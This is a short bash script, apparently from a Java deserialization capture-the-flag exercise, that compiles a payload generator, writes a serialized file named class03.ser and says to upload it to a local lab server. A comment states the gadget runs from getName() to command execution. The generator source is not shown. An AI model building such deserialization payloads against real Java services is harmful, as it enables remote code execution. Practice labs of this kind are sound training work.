#!/bin/bash
# class03 — getName() → 命令执行
cd "$(dirname "$0")"
# 编译 common Student + GenPayload
javac src/com/ctfstu/common/Student.java src/GenPayload.java -d out
java -cp out GenPayload
mv class03.ser .. 2>/dev/null
rm -rf out
echo "🎯 上传 class03.ser 到 http://localhost:81/class03/"
